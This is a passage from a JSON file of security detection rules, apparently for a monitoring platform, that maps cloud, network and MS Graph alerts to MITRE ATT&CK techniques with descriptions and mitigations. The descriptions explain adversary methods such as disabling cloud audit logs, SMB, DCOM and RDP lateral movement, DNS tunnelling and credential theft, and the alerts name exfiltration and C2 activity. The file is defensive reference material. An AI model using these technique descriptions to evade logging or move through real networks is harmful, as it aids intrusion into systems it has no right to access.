deactivated.\n\n\nIn Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account. As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user\u2019s primary password is reset."
        ],
        "mitigation_strategies": [
            "Ensure that low-privileged user accounts do not have permission to add access keys to accounts. In AWS environments, prohibit users from calling the `sts:GetFederationToken` API unless explicitly required."
        ]
    },
    {
        "rule_id": 99030,
        "rule_description": "Possible disruption of CloudTrail Logging: Management events logging disabled with an event selector.",
        "mitre_id": [
            "T1562.008"
        ],
        "possible_attacks": [
            "Disable or Modify Cloud Logs"
        ],
        "description": [
            "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license."
        ],
        "mitigation_strategies": [
            "Configure default account policy to enable logging. Manage policies to ensure only necessary users have permissions to make changes to logging policies."
        ]
    },
    {
        "rule_id": 99051,
        "rule_description": "Amazon Security Lake - VPC - SSH connection established.",
        "mitre_id": [
            "T1021.004"
        ],
        "possible_attacks": [
            "SSH"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user."
        ],
        "mitigation_strategies": [
            "Limit which user accounts are allowed to login via SSH."
        ]
    },
    {
        "rule_id": 99052,
        "rule_description": "Amazon Security Lake - VPC - SSH connection established.",
        "mitre_id": [
            "T1021.004"
        ],
        "possible_attacks": [
            "SSH"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user."
        ],
        "mitigation_strategies": [
            "Limit which user accounts are allowed to login via SSH."
        ]
    },
    {
        "rule_id": 99053,
        "rule_description": "Amazon Security Lake - VPC - RDP connection established.",
        "mitre_id": [
            "T1021.001"
        ],
        "possible_attacks": [
            "Remote Desktop Protocol"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features]( or [Terminal Services DLL]( for Persistence."
        ],
        "mitigation_strategies": [
            "Limit remote user permissions if remote access is necessary."
        ]
    },
    {
        "rule_id": 99054,
        "rule_description": "Amazon Security Lake - VPC - RDP connection established.",
        "mitre_id": [
            "T1021.001"
        ],
        "possible_attacks": [
            "Remote Desktop Protocol"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features]( or [Terminal Services DLL]( for Persistence."
        ],
        "mitigation_strategies": [
            "Limit remote user permissions if remote access is necessary."
        ]
    },
    {
        "rule_id": 99055,
        "rule_description": "Amazon Security Lake - VPC - SMB connection established.",
        "mitre_id": [
            "T1021.002"
        ],
        "possible_attacks": [
            "SMB/Windows Admin Shares"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts]( to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job]( [Service Execution]( and [Windows Management Instrumentation]( Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash]( and certain configuration and patch levels."
        ],
        "mitigation_strategies": [
            "Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems."
        ]
    },
    {
        "rule_id": 99056,
        "rule_description": "Amazon Security Lake - VPC: SMB connection established.",
        "mitre_id": [
            "T1021.002"
        ],
        "possible_attacks": [
            "SMB/Windows Admin Shares"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts]( to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job]( [Service Execution]( and [Windows Management Instrumentation]( Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash]( and certain configuration and patch levels."
        ],
        "mitigation_strategies": [
            "Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems."
        ]
    },
    {
        "rule_id": 99057,
        "rule_description": "Amazon Security Lake - VPC - DCE/RPC connection established.",
        "mitre_id": [
            "T1021.003"
        ],
        "possible_attacks": [
            "Distributed Component Object Model"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke [Dynamic Data Exchange]( (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation]( "
        ],
        "mitigation_strategies": [
            "Modify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\AppID\\{{AppID_GUID}}` associated with the process-wide security of individual COM applications.\n\nModify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole` associated with system-wide security defaults for all COM applications that do not set their own process-wide security. "
        ]
    },
    {
        "rule_id": 99058,
        "rule_description": "Amazon Security Lake - VPC - DCE/RPC connection established.",
        "mitre_id": [
            "T1021.003"
        ],
        "possible_attacks": [
            "Distributed Component Object Model"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke [Dynamic Data Exchange]( (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation]( "
        ],
        "mitigation_strategies": [
            "Modify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\AppID\\{{AppID_GUID}}` associated with the process-wide security of individual COM applications.\n\nModify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole` associated with system-wide security defaults for all COM applications that do not set their own process-wide security. "
        ]
    },
    {
        "rule_id": 99080,
        "rule_description": "Amazon Security Lake - Route 53 - Succsessful DNS request [$(query.type)] \"$(query.hostname)\" from $(src_endpoint.ip).",
        "mitre_id": [
            "T1071.004",
            "T1584.002"
        ],
        "possible_attacks": [
            "DNS",
            "DNS Server"
        ],
        "description": [
            "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
            "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol]( Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates]( to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications. Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. ",
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
        ]
    },
    {
        "rule_id": 99081,
        "rule_description": "Amazon Security Lake - Route 53 - Failed DNS request for a Non-Existent Domain [$(query.type)] \"$(query.hostname)\" from $(src_endpoint.ip).",
        "mitre_id": [
            "T1071.004",
            "T1584.002"
        ],
        "possible_attacks": [
            "DNS",
            "DNS Server"
        ],
        "description": [
            "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
            "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol]( Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates]( to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications. Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. ",
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
        ]
    },
    {
        "rule_id": 99082,
        "rule_description": "Amazon Security Lake - Route 53 - Failed DNS request [$(query.type)] \"$(query.hostname)\" from $(src_endpoint.ip).",
        "mitre_id": [
            "T1071.004",
            "T1584.002"
        ],
        "possible_attacks": [
            "DNS",
            "DNS Server"
        ],
        "description": [
            "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
            "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol]( Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates]( to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications. Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. ",
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
        ]
    },
    {
        "rule_id": 99522,
        "rule_description": "MS Graph message: Indicators that the system is potentially communicating with a C2 server have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "TA0011"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99523,
        "rule_description": "MS Graph message: Indicators that the system is potentially performing data collection or data discovery have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "TA0009"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99524,
        "rule_description": "MS Graph message: Indicators that the system is potentially involved in stealing credentials have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "TA0006"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99525,
        "rule_description": "MS Graph message: Indicators that the system is potentially performing defense evasion have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "TA0005"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99526,
        "rule_description": "MS Graph message: Indicators that the system is potentially performing network discovery or account enumeration have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "TA0007"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99527,
        "rule_description": "MS Graph message: Indicators that the system is potentially performing data exfiltration have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "TA0010"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99528,
        "rule_description": "MS Graph message: Indicators of potential vulnerability exploitation on the system have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "T1587.004"
        ],
        "possible_attacks": [
            "Exploits"
        ],
        "description": [
            "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via [Vulnerabilities]( to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application]( [Exploitation for Client Execution]( [Exploitation for Privilege Escalation]( [Exploitation for Defense Evasion]( [Exploitation for Credential Access]( [Exploitation of Remote Services]( and [Application or System Exploitation]("
        ],
        "mitigation_strategies": [
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
        ]
    },
    {
        "rule_id": 99529,
        "rule_description": "MS Graph message: Indicators that the system is potentially performing malicious code execution have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "TA0002"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99530,
        "rule_description": "MS Graph message: Indicators that the system is potentially experiencing intrusion attempts have been detected. This alert is commonly caused by phishing emails. Check the system for signs of infection.",
        "mitre_id": [
            "TA0001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99531,
        "rule_description": "MS Graph message: Indicators that the system is potentially establishing unauthorized internal connections have been detected. Check the systems for signs of infection.",
        "mitre_id": [
            "TA0008"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99532,
        "rule_description": "MS Graph message: Indicators that the system is potentially infected with malware have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "T1204.001",
            "T1204.002",
            "T1204.003",
            "T1587.001",
            "T1588.001"
        ],
        "possible_attacks": [
            "Malicious Link",
            "Malicious File",
            "Malicious Image",
            "Malware",
            "Malware"
        ],
        "description": [
            "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link]( Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution]( Links may also lead users to download files that require execution via [Malicious File](",
            "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment]( Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\n\nAdversaries may employ various forms of [Masquerading]( and [Obfuscated Files or Information]( to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile [Malicious File]( frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](",
            "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware]( and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](",
            "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](",
            "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries)."
        ],
        "mitigation_strategies": [
            "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.",
            "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.",
            "Train users to be aware of the existence of malicious images and how to avoid deploying instances and containers from them.",
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.",
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
        ]
    },
    {
        "rule_id": 99533,
        "rule_description": "MS Graph message: Indicators that the system is potentially experiencing persistence establishment attempts have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "TA0003"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99534,
        "rule_description": "MS Graph message: Indicators that the system is potentially performing unauthorized permission elevation have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "TA0004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99535,
        "rule_description": "MS Graph Message: Indicators that the system is potentially affected by ransomware have been detected. Check the system for signs of infection.",
        "mitre_id": [
            "T1486"
        ],
        "possible_attacks": [
            "Data Encrypted for Impact"
        ],
        "description": [
            "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification]( or [System Shutdown/Reboot]( in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares]( Encryption malware may also leverage [Internal Defacement]( such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted."
        ],
        "mitigation_strategies": [
            "Consider implementing IT disaster recovery plans that contain procedures for regularly taking and testing data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery. Consider enabling versioning in cloud environments to maintain backup copies of storage objects."
        ]
    },
    {
        "rule_id": 99543,
        "rule_description": "MS Graph message: Indicators that the system is communicating with a C2 server have been detected. This alert usually originates from common malware and threats, rather than APT activity. Check the system for signs of infection.",
        "mitre_id": [
            "TA0011"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99544,
        "rule_description": "MS Graph message: Indicators that the system is performing data collection or data discovery have been detected. This alert usually originates from common malware and threats, rather than APT activity. Check the system for signs of infection.",
        "mitre_id": [
            "TA0009"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99545,
        "rule_description": "MS Graph message: Indicators that the system is involved in stealing credentials have been detected. This alert usually originates from common malware and threats, rather than APT activity. Check the system for signs of infection.",
        "mitre_id": [
            "TA0006"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99546,
        "rule_description": "MS Graph message: Indicators that the system is performing defense evasion have been detected. This alert usually originates from common malware and threats, rather than APT activity. Check the system for signs of infection.",
        "mitre_id": [
            "TA0005"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99547,
        "rule_description": "MS Graph message: Indicators that the system is performing network discovery or account enumeration have been detected. This alert usually originates from common malware and threats, rather than APT activity. Check the system for signs of infection.",
        "mitre_id": [
            "TA0007"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99548,
        "rule_description": "MS Graph message: Indicators that the system is performing data exfiltration have been detected. This alert usually originates from common malware and threats, rather than APT activity. Check the system for signs of infection.",
        "mitre_id": [
            "TA0010"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99549,
        "rule_description": "MS Graph message: Indicators of vulnerability exploitation on the system have been detected. However, this alert is unlikely to indciate an APT. Check the system for signs of infection.",
        "mitre_id": [
            "T1587.004"
        ],
        "possible_attacks": [
            "Exploits"
        ],
        "description": [
            "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via [Vulnerabilities]( to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application]( [Exploitation for Client Execution]( [Exploitation for Privilege Escalation]( [Exploitation for Defense Evasion]( [Exploitation for Credential Access]( [Exploitation of Remote Services]( and [Application or System Exploitation]("
        ],
        "mitigation_strategies": [
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
        ]
    },
    {
        "rule_id": 99550,
        "rule_description": "MS Graph message: Indicators that the system is performing malicious code execution have been detected. However, this alert is unlikely to indciate an APT. Check the system for signs of infection.",
        "mitre_id": [
            "TA0002"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99551,
        "rule_description": "MS Graph message: Indicators that the system is affected by intrusion attempts have been detected. This alert usually originates from common malware and threats, rather than APT activity. Check the system for signs of infection.",
        "mitre_id": [
            "TA0001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99552,
        "rule_description": "MS Graph message: Indicators that the system is establishing unauthorized internal connections have been detected. This alert usually originates from common malware and threats, rather than APT activity. Check the systems for signs of infection.",
        "mitre_id": [
            "TA0008"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99553,
        "rule_description": "MS Graph message: Indicators that the system is affected by persistence establishment attempts have been detected. This alert usually originates from common malware and threats, rather than APT activity. Check the system for signs of infection.",
        "mitre_id": [
            "TA0003"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99554,
        "rule_description": "MS Graph message: Indicators that the system is performing unauthorized permission elevation have been detected. This alert usually originates from common malware and threats, rather than APT activity. Check the system for signs of infection.",
        "mitre_id": [
            "TA0004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99562,
        "rule_description": "MS Graph message: Indicators that the system is communicating with a C2 server have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0011"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99563,
        "rule_description": "MS Graph message: Indicators that the system is performing data collection or data discovery have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0009"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99564,
        "rule_description": "MS Graph message: Indicators that the system is involved in stealing credentials have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0006"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99565,
        "rule_description": "MS Graph message: Indicators that the system is performing defense evasion have been detected. This alert may be indicative of an APT.",
        "mitre_id": [
            "TA0005"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 99566,
